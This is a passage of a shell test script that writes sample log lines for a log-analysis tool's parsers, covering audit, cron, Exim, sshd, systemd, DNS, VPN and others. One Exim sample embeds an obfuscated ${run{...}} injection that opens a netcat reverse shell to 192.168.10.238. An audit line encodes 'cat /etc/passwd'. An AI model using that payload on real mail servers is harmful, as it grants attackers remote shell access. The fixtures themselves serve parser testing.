            echo "audispd: type=SYSTEM_BOOT msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=SYSTEM_RUNLEVEL msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=SYSTEM_SHUTDOWN msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=TRUSTED_APP msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=TTY msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=USER_ACCT msg=audit(1234877011.795:7732): user pid=26127 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"root\" exe=\"/usr/sbin/sshd\" (hostname=jupiter.example.com, addr=192.168.2.100, terminal=ssh res=success)'" >> $LOGFILE
            echo "audispd: type=USER_AUTH msg=audit(1451403184.143:1834): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=failed'" >> $LOGFILE
            echo "audispd: type=USER_AUTH msg=audit(1451403193.995:1835): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOGFILE
            echo "audispd: type=USER_AVC msg=audit(1234567890.123:1234): Text" >> $LOGFILE
            echo "audispd: type=USER_CHAUTHTOK msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_CMD msg=audit(1450785575.705:3316357): user pid=21619 uid=0 auid=526 msg='cwd=\"/home/hi\" cmd=\"/bin/bash\" (terminal=pts/0 res=success)'" >> $LOGFILE
            echo "audispd: type=USER_END msg=audit(1450767601.813:3296218): user pid=15764 uid=0 auid=0 msg='PAM: session close acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOGFILE
            echo "audispd: type=USER_ERR msg=audit(1450770602.157:3300444): user pid=16643 uid=0 auid=4294967295 msg='PAM: bad_ident acct="?" : exe=\"/usr/sbin/sshd\" (hostname=111.111.211.38, addr=111.111.211.38, terminal=ssh res=failed)'" >> $LOGFILE
            echo "audispd: type=USER_LABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_LOGIN msg=audit(1450770603.209:3300446): user pid=16649 uid=0 auid=4294967295 msg='acct=\"root\": exe=\"/usr/sbin/sshd\" (hostname=?, addr=11.111.53.58, terminal=sshd res=failed)'" >> $LOGFILE
            echo "audispd: type=USER_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_MAC_POLICY_LOAD msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_MGMT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_ROLE_CHANGE msg=audit(1280266360.845:51): user pid=1978 uid=0 auid=500 subj=system_u:system_r:local_login_t:s0-s0:c0.c1023 msg='pam: default-context=user_u:system_r:unconfined_t:s0 selected-context=user_u:system_r:unconfined_t:s0: exe=\"/bin/login\" (hostname=?, addr=?, terminal=tty1 res=success)'" >> $LOGFILE
            echo "audispd: type=USER_SELINUX_ERR msg=audit(1311948547.151:138): Text" >> $LOGFILE
            echo "audispd: type=USER_START msg=audit(1450771201.437:3301540): user pid=16878 uid=0 auid=0 msg='PAM: session open acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOGFILE
            echo "audispd: type=USER_TTY msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USER_UNLABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=USYS_CONFIG msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=VIRT_CONTROL msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=VIRT_MACHINE_ID msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audispd: type=VIRT_RESOURCE msg=audit(1450770603.209:3300446): Text" >> $LOGFILE
            echo "audisp-remote: queue is full - dropping event" >> $LOGFILE
            echo "audispd: queue is full - dropping event" >> $LOGFILE
            echo "audispd: type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOGFILE
            ;;
        CronParsingModel)
            echo "CRON[25537]: (root) CMD ping 8.8.8.8" > $LOGFILE
            echo "CRON[25537]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "cron[25537]: (*system*mailman) RELOAD (/var/spool/cron/mailman)" >> $LOGFILE
            echo "CRON[12461]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)" >> $LOGFILE
            echo "CRON[12460]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOGFILE
            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOGFILE
            ;;
        EximGenericParsingModel)
            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOGFILE
            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOGFILE
            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOGFILE
            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOGFILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOGFILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOGFILE
            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOGFILE
            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOGFILE
            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOGFILE
            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOGFILE
            # following examples are covering exim failure message types. The examples are taken from
            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOGFILE
            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOGFILE
            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOGFILE
            echo "2014-09-18 13:44:19 1XUb4M-000v5R-6R SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=1811: host mta7.am0.yahoodns.net [66.66.66.66]: 421 4.7.1 [TS03] All messages from 5.196.113.212 will be permanently deferred; Retrying will NOT succeed. See http://postmaster.yahoo.com/421-ts03.html" >> $LOGFILE
            echo "TO:<someone@someaddress>: host mx.someaddress.com [20.20.20.20]: 450 4.7.1 Client host rejected: cannot find your hostname, [20.20.20.20] 2014-09-21 16:06:05 1XUKFa-0003bb-EM ** someone@someaddress>: retry timeout exceeded" >> $LOGFILE
            echo "2014-10-10 10:25:01 1XcKLM-003IGU-Fr SMTP error from remote mail server after RCPT TO:<ma@bol.com>: host pro-mail-mx-002.bol.com [20.20.20.20]: 450 4.7.1 Service unavailable" >> $LOGFILE
            echo "2014-09-24 12:59:49 1XWqqy-00028x-FK == test@badluckbryan.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<test@gylsystems.com>: host gylsystems.com [69.69.69.69]: 451 Temporary local problem - please try later" >> $LOGFILE
            echo "2014-11-24 11:25:33 H=localhost (mail.fictional.example) [::1]:49956 sender verify defer for <aaron@domain.com>: require_files: error for /home/aaron/etc/domain.com: Permission denied" >> $LOGFILE
            echo "2014-11-24 11:25:33 H=localhost (srv-hs1.netsons.net) [::1]:49956 F=<aaron@domain.com> A=dovecot_login:aaron@domain.com temporarily rejected RCPT <test@pleasecheck.net>: Could not complete sender verify" >> $LOGFILE
            echo "2014-09-13 11:37:53 1XSdCz-00049U-5A ==aaron@domain.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 452 <aron@domain.com> Domain size limit exceeded" >> $LOGFILE
            echo "2014-08-31 08:43:16 1XO5PX-0006SC-Qa ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.domain.com [10.5.40.204]: 550-Verification for <garfield@domain.com>\n550-The mail server could not deliver mail to garfield@domain.com. The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.\n550 Sender verify failed" >> $LOGFILE
            echo "SMTP error from remote mail server after RCPT TO:: host mail.fictional.example[10.5.40.204]: 550-Sender has no A, AAAA, or MX DNS records. mail.fictional.example\n550 l mail.fictional.example\nVerify the zone file in /etc/named for the correct information. If it appear correct, you can run named-checkzone domain.com domain.com.db to verify if named is able to load the zone." >> $LOGFILE
            echo "Diagnostic-Code: X-Postfix; host mail1.domain.com [10.5.40.204] said: 550 5.7.1 Message rejected due to content restrictions (in reply to end of DATA command)\nWhen you see an error such as 550 5.7.1" >> $LOGFILE
            echo "Final-Recipient: rfc822;aaron@domain.com\nAction: failed\nStatus: 5.5.0\nDiagnostic-Code: smtp;550-Please turn on SMTP Authentication in your mail client.\n550-mail.fictional.example [10.5.40.204]:58133 is not permitted to relay 550 through this server without authentication." >> $LOGFILE
            echo "DHE-RSA-AES256-SHA:256: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1834: host mail.fictional.example [10.5.40.204..212]: 550 \"REJECTED - Bad HELO - Host impersonating [mail.fictional2.example]\"" >> $LOGFILE
            echo "2014-08-31 08:43:16 1XO5PY-0006SO-GS <= <> R=1XO5PX-0006SC-Qa U=mailnull P=local S=1951 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com" >> $LOGFILE
            echo "SMTP error from remote mail server after MAIL FROM:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 553 sorry, your domain does not exists." >> $LOGFILE
            echo "2014-11-26 10:26:32 1XtYro-004Ecv-65 ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1604: host mail.fictional.example [10.5.40.204]: 553 <aaron@domain.com> unable to verify address\nVerify that SMPT authentication has been enabled." >> $LOGFILE
            echo "[15:03:30 hosts5 root /var/log]cPs# grep 1XeRdP-0006JC-FO exim_mainlog 2014-10-15 12:41:11 1XeRdP-0006JC-FO <= <> R=1XeRdF-0006HI-EY U=mailnull P=local S=5445 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com 2014-10-15 12:41:11 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1XeRdP-0006JC-FO 2014-10-15 12:42:12 1XeRdP-0006JC-FO ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after end of data: host mail.fictional.example [10.5.40.204]: 554 rejected due to spam content" >> $LOGFILE
            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS H=mail.fictional.example [10.5.40.204]:4779 Warning: \"SpamAssassin as marka22 detected message as spam (11.0)\"" >> $LOGFILE
            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS <=10.5.40.204 H=mail.fictional.example[10.5.40.204]:4779 P=esmtp S=491878 id=dos45yx4zbmri7f@domain.com T="Payment confirmation: 7037487121" for aaron@domain.net [" >> $LOGFILE
            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS => aaron  <aaron@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOGFILE
            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS Completed 2014-10-01 15:30:35 1XZKvG-0002HW-ML H=(12-12-12-12.domain.net [10.5.40.204]:65376 Warning: \"SpamAssassin as marka22 detected message as spam (7.2)\"" >> $LOGFILE
            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML <= item@something.net H=(12-12-12-12.domain.net [10.5.40.204]:65376 P=esmtp S=519381 id=dos45yx4zbmri7f@domain.com T=\"Payment confirmation: 7037487121\" for mark@domain.com 2014-10-01 15:30:35 1XZKvG-0002HW-ML => mark <mark@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOGFILE
            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML Completed" >> $LOGFILE
            echo "2014-09-10 13:06:55 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOGFILE
            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: \"SpamAssassin as cpaneleximscanner detected OUTGOING smtp message as NOT spam (-0.1)\"" >> $LOGFILE
            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG <= bob@bob.com H=mail.fictional.example [10.5.40.204]:46793 P=esmtpsa X=TLSv1:AES128-SHA:128 A=dovecot_login:aaron@domain.com S=18635 T=\"14\\\" plates\" for live@somedomain.com" >> $LOGFILE
            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG SMTP connection outbound 1410368816 1XRlM6-003yMv-KG domain.com live@somedomain.com" >> $LOGFILE
            echo "2014-09-10 13:07:22 1XRlM6-003yMv-KG => live@somedomain.com R=dkim_lookuphost T=dkim_remote_smtp H=mail.fictional.example [10.5.40.204] X=TLSv1:DHE-RSA-AES256-SHA:256 C=\"250 OK id=1XRlMC-0006w5-F4\" 2014-09-10 13:07:22 1XRlM6-003yMv-KG Completed" >> $LOGFILE
            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: \"SpamAssassin as sfgthib detected message as spam (998.0)\" 2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOGFILE
            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR <= cpaneltest@gmail.com H=mail.fictional.example [10.5.40.204]:42603 P=esmtps X=TLSv1:RC4-SHA:128 S=3411 id=CAPtYmmQYRDb38yTmnA_ULZVjnKVOdtu6yw-HapGmjBCAk6rYYw@mail.gmail.com T=\"test\" for aaron@domain.com" >> $LOGFILE
            ;;
        KernelMsgParsingModel)
            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" > $LOGFILE
            echo "kernel: martian source 192.168.1.255 from 192.168.1.251, on dev eth3" >> $LOGFILE
            echo "kernel: ll header: ff:ff:ff:ff:ff:ff:00:18:f8:0e:81:93:08:00" >> $LOGFILE
            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" >> $LOGFILE
            echo "kernel: ll header: 00000000: ff ff ff ff ff ff 00 50 56 ad 59 09 08 00 .......PV.Y..." >> $LOGFILE
            echo "kernel: ll header: 00000000: ff ff ff ff ff ff a6 2c 90 bb 31 e9 08 06        .......,..1..." >> $LOGFILE
            ;;
        NtpParsingModel)
            echo "ntpd[8457]: Listen and drop on 0 v6wildcard [::]:123" > $LOGFILE
            echo "ntpd[8457]: Listen and drop on 1 v4wildcard 0.0.0.0:123" >> $LOGFILE
            echo "ntpd[8457]: Listen normally on 2 lo 127.0.0.1:123" >> $LOGFILE
            echo "ntpd[8457]: Listen normally on 3 eth0 1.2.2.19:123" >> $LOGFILE
            echo "ntpd[8457]: Listening on routing socket on fd #20 for interface updates" >> $LOGFILE
            echo "ntpd[21152]: logging to file /var/log/ntplog" >> $LOGFILE
            echo "ntpd[22760]: Soliciting pool server 78.41.116.113" >> $LOGFILE
            echo "ntpd[23165]: ntpd 4.2.8p12@1.3728-o (1): Starting" >> $LOGFILE
            echo "ntpd[23165]: Command line: ntpd" >> $LOGFILE
            echo "ntpd[23165]: must be run as root, not uid 1000" >> $LOGFILE
            echo "ntpd[23170]: proto: precision = 0.045 usec (-24)" >> $LOGFILE
            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): good hash signature" >> $LOGFILE
            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): loaded, expire=2021-12-28T00:00:00Z last=2017-01-01T00:00:00Z ofs=37" >> $LOGFILE
            echo "ntpd[23170]: unable to bind to wildcard address :: - another process may be running - EXITING" >> $LOGFILE
            ;;
        RsyslogParsingModel)
            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.4.2\" x-pid=\"1812\" x-info=\"http://www.rsyslog.com\"] rsyslogd was HUPed" > $LOGFILE
            echo "rsyslogd0: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/0 ]" >> $LOGFILE
            echo "rsyslogd-2359: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/2359 ]" >> $LOGFILE
            echo "rsyslogd-2007: action 'action 17' suspended, next retry is Sun May 24 06:56:28 2015 [try http://www.rsyslog.com/e/2007 ]" >> $LOGFILE
            echo "rsyslogd: rsyslogd's groupid changed to 109" >> $LOGFILE
            echo "rsyslogd: rsyslogd's userid changed to 104" >> $LOGFILE
            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"28018\" x-info=\"https://www.rsyslog.com\"] start" >> $LOGFILE
            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"542\" x-info=\"https://www.rsyslog.com\"] rsyslogd was HUPed" >> $LOGFILE
            echo "rsyslogd-2222: command 'KLogPermitNonKernelFacility' is currently not permitted - did you already set it via a RainerScript command (v6+ config)? [v8.16.0 try http://www.rsyslog.com/e/2222 ]" >> $LOGFILE
            ;;
        SshdParsingModel)
            echo "sshd[35618]: Server listening on 0.0.0.0 port 22." > $LOGFILE
            echo "sshd[35619]: Failed password for someuser from 1.1.1.1 port 1372 ssh2" >> $LOGFILE
            echo "sshd[35619]: Accepted password for someuser from 1.1.1.1 port 1372 ssh2" >> $LOGFILE
            echo "sshd[36108]: Accepted publickey for someuser from 1.1.1.2 port 51590 ssh2" >> $LOGFILE
            echo "sshd[54798]: error: maximum authentication attempts exceeded for root from 122.121.51.193 port 59928 ssh2 [preauth]" >> $LOGFILE
            echo "sshd[54798]: Disconnecting authenticating user root 122.121.51.193 port 59928: Too many authentication failures [preauth]" >> $LOGFILE
            echo "sshd[5197]: Accepted publickey for fred from 192.0.2.60 port 59915 ssh2: RSA SHA256:5xyQ+PG1Z3CIiShclJ2iNya5TOdKDgE/HrOXr21IdOo" >> $LOGFILE
            echo "sshd[50140]: Accepted publickey for fred from 192.0.2.60 port 44456 ssh2: ECDSA-CERT SHA256:qGl9KiyXrG6mIOo1CT01oHUvod7Ngs5VMHM14DTbxzI ID foobar (serial 9624) CA ED25519 SHA256:fZ6L7TlBLqf1pGWzkcQMQMFZ+aGgrtYgRM90XO0gzZ8" >> $LOGFILE
            echo "sshd[5104]: Accepted publickey for fred from 192.0.2.60 port 60594 ssh2: RSA e8:31:68:c7:01:2d:25:20:36:8f:50:5d:f9:ee:70:4c" >> $LOGFILE
            echo "sshd[252]: Connection closed by authenticating user fred 192.0.2.60 port 44470 [preauth]" >> $LOGFILE
            echo "sshd[90593]: fatal: Timeout before authentication for 192.0.2.60 port 44718" >> $LOGFILE
            echo "sshd[252]: error: Certificate invalid: expired" >> $LOGFILE
            echo "sshd[90593]: error: Certificate invalid: not yet valid" >> $LOGFILE
            echo "sshd[98884]: error: Certificate invalid: name is not a listed principal" >> $LOGFILE
            echo "sshd[2420]: cert: Authentication tried for fred with valid certificate but not from a permitted source address (192.0.2.61)." >> $LOGFILE
            echo "sshd[2420]: error: Refused by certificate options" >> $LOGFILE
            echo "sshd[26299]: Failed none for fred from 192.0.2.60 port 47366 ssh2" >> $LOGFILE
            echo "sshd[26299]: User child is on pid 21613" >> $LOGFILE
            echo "sshd[21613]: Changed root directory to \"/home/fred\"" >> $LOGFILE
            echo "sshd[21613]: subsystem request for sftp" >> $LOGFILE
            echo "sshd[83709]: packet_write_poll: Connection from 192.0.2.97 port 57608: Host is down" >> $LOGFILE
            echo "sshd[9075]: debug1: Got 100/147 for keepalive" >> $LOGFILE
            echo "sshd[73960]: debug2: channel 0: request keepalive@openssh.com confirm 1" >> $LOGFILE
            echo "sshd[73960]: debug3: send packet: type 98" >> $LOGFILE
            echo "sshd[73960]: debug3: receive packet: type 100" >> $LOGFILE
            echo "sshd[73960]: debug1: Got 100/22 for keepalive" >> $LOGFILE
            echo "sshd[15780]: debug1: do_cleanup" >> $LOGFILE
            echo "sshd[48675]: debug1: session_pty_cleanup: session 0 release /dev/ttyp0" >> $LOGFILE
            echo "sshd[29235]: error: Authentication key RSA SHA256:jXEPmu4thnubqPUDcKDs31MOVLQJH6FfF1XSGT748jQ revoked by file /etc/ssh/ssh_revoked_keys" >> $LOGFILE
            echo "sshd[38594]: Invalid user ubnt from 201.179.249.231 port 52471" >> $LOGFILE
            echo "sshd[38594]: Failed password for invalid user ubnt from 201.179.249.231 port 52471 ssh2" >> $LOGFILE
            echo "sshd[38594]: error: maximum authentication attempts exceeded for invalid user ubnt from 201.179.249.231 port 52471 ssh2 [preauth]" >> $LOGFILE
            echo "sshd[38594]: Disconnecting invalid user ubnt 201.179.249.231 port 52471: Too many authentication failures [preauth]" >> $LOGFILE
            echo "sshd[93126]: Failed none for invalid user admin from 125.64.94.136 port 27586 ssh2" >> $LOGFILE
            echo "sshd[9265]: Accepted password for fred from 127.0.0.1 port 40426 ssh2" >> $LOGFILE
            echo "sshd[5613]: Invalid user cloud from ::1 port 57404" >> $LOGFILE
            echo "sshd[5613]: Failed password for invalid user cloud from ::1 port 57404 ssh2" >> $LOGFILE
            echo "sshd[5613]: Connection closed by invalid user cloud ::1 port 57404 [preauth]" >> $LOGFILE
            echo "sshd[3545]: pam_succeed_if(sshd:auth): requirement \"uid >= 1000\" not met by user \"root\"" >> $LOGFILE
            echo "sshd[3545]: pam_unix(sshd:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "sshd[3545]: Received disconnect from ::1: 11: disconnected by user" >> $LOGFILE
            echo "sshd[3545]: pam_unix(sshd:session): session closed for user root" >> $LOGFILE
            echo "sshd[4182]: error: Could not load host key: /etc/ssh/ssh_host_dsa_key" >> $LOGFILE
            ;;
        SsmtpParsingModel)
            echo "sSMTP[24391]: /usr/sbin/sendmail sent mail for raul" > $LOGFILE
            ;;
        SuSessionParsingModel)
            echo "su[10710]: Successful su for user by root" > $LOGFILE
            echo "su[10710]: + ??? root:user" >> $LOGFILE
            echo "su[10710]: pam_unix(su:session): session opened for user user by (uid=0)" >> $LOGFILE
            echo "su[10710]: pam_unix(su:session): session closed for user user" >> $LOGFILE
            ;;
        SyslogPreambleModel)
            echo "Feb 29 00:01:41 mail-0 " > $LOGFILE
            echo "Mar  1 06:25:38 mail " >> $LOGFILE
            ;;
        SystemdParsingModel)
            echo "systemd[1]: phpsessionclean.service: Succeeded." > $LOGFILE
            echo "systemd[1]: Finished Clean php session files." >> $LOGFILE
            echo "systemd[1]: logrotate.service: Succeeded." >> $LOGFILE
            echo "systemd[1]: Finished Rotate log files." >> $LOGFILE
            echo "systemd[1]: man-db.service: Succeeded." >> $LOGFILE
            echo "systemd[1]: Finished Daily man-db regeneration." >> $LOGFILE
            echo "systemd[1]: Finished Ubuntu Advantage APT and MOTD Messages." >> $LOGFILE
            echo "systemd[1]: Finished Refresh fwupd metadata and update motd." >> $LOGFILE
            echo "systemd[1]: Finished Daily apt download activities." >> $LOGFILE
            echo "systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOGFILE
            echo "systemd[1]: Finished Daily apt upgrade and clean activities." >> $LOGFILE
            echo "systemd[1]: anacron.service: Killing process 39123 (update-notifier) with signal SIGKILL." >> $LOGFILE
            echo "systemd[1]: Starting PackageKit Daemon..." >> $LOGFILE
            echo "systemd[1]: Started PackageKit Daemon." >> $LOGFILE
            echo "systemd[1]: Reloading." >> $LOGFILE
            echo "systemd[2318]: var-lib-docker-overlay2-check\x2doverlayfs\x2dsupport037009939-merged.mount: Succeeded." >> $LOGFILE
            echo "systemd[2318]: Started VTE child process 54668 launched by gnome-terminal-server process 2984." >> $LOGFILE
            echo "systemd-logind[2445]: New session 2172664 of user dbi_backup." >> $LOGFILE
            echo "systemd-logind[760]: Session 230 logged out. Waiting for processes to exit." >> $LOGFILE
            echo "systemd-logind[760]: Removed session 230." >> $LOGFILE
            echo "systemd-logind[760]: New session 231 of user egoebelbecker." >> $LOGFILE
            echo "systemd-logind[467]: Failed to abandon session scope: Transport endpoint is not connected" >> $LOGFILE
            ;;
        TomcatParsingModel)
            # model is not updated to the latest version and therefore not tested.
            rm $LOGFILE
            touch $LOGFILE
            ;;
        UlogdParsingModel)
            echo "ulogd[4655]: id=\"2001\" severity=\"info\" sys=\"SecureNet\" sub=\"packetfilter\" name=\"Packet dropped\" action=\"drop\" fwrule=\"60001\" initf=\"eth0\" srcmac=\"******\" dstmac=\"******x\" srcip=\"10.64.0.22\" dstip=\"10.64.0.10\" proto=\"6\" length=\"52\" tos=\"0x00\" prec=\"0x00\" ttl=\"128\" srcport=\"443\" dstport=\"56174\" tcpflags=\"ACK FIN\"" > $LOGFILE
            echo "ulogd[4655]: id=\"2001\" severity=\"info\" sys=\"SecureNet\" sub=\"packetfilter\" name=\"Packet dropped\" action=\"drop\" fwrule=\"60001\" initf=\"eth0\" srcmac=\"******xx\" dstmac=\"******x\" srcip=\"10.64.0.22\" dstip=\"10.64.0.10\" proto=\"6\" length=\"153\" tos=\"0x00\" prec=\"0x00\" ttl=\"128\" srcport=\"443\" dstport=\"56174\" tcpflags=\"ACK PSH FIN\"" >> $LOGFILE
            ;;
        DnsParsingModel)
            echo "Jan 20 11:21:42 dnsmasq[3326]: started, version 2.79 cachesize 150"
            echo "Jan 20 11:21:42 dnsmasq[3326]: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack ipset auth nettlehash DNSSEC loop-detect inotify"
            echo "Jan 20 11:21:42 dnsmasq[3326]: using nameserver 8.8.8.8#53"
            echo "Jan 20 11:21:42 dnsmasq[3326]: using nameserver 192.168.230.122#53 for domain email-19.kennedy-mendoza.info"
            echo "Jan 20 11:21:42 dnsmasq[3326]: read /etc/hosts - 7 addresses"
            echo "Jan 20 11:21:55 dnsmasq[3414]: query[SRV] _http._tcp.archive.ubuntu.com from 192.168.230.4"
            echo "Jan 20 11:21:55 dnsmasq[3414]: forwarded _http._tcp.archive.ubuntu.com to 8.8.8.8"
            echo "Jan 20 11:21:55 dnsmasq[3414]: reply archive.ubuntu.com is 91.189.88.152"
            echo "Jan 20 11:23:40 dnsmasq[3326]: cached debian.map.fastlydns.net is 199.232.138.132"
            echo "Jan 20 11:21:42 inet-dns dnsmasq[1969]: exiting on receipt of SIGTERM"
            echo "Jan 20 13:47:14 dnsmasq[3326]: nameserver 127.0.0.1 refused to do a recursive query"
            echo "Jan 21 07:05:20 dnsmasq[3468]: failed to access /etc/dnsmasq.d/dnsmasq-resolv.conf: No such file or directory"
            echo "Jan 24 03:56:53 dnsmasq[15084]: config version.bind is <TXT>"
            ;;
        OpenVpnParsingModel)
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 TLS: soft reset sec=3308/3308 bytes=45748/-1 pkts=649/0"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 VERIFY OK: depth=1, C=AT, ST=Vienna, L=Vienna, O=Some Organisation GmbH, CN=OpenVPN CA, emailAddress=admin@organisation.cyberrange.at"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 VERIFY KU OK"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 Validating certificate extended key usage"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 ++ Certificate has EKU (str) TLS Web Client Authentication, expects TLS Web Client Authentication"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_VER=2.4.4"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_PLAT=linux"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_PROTO=2"
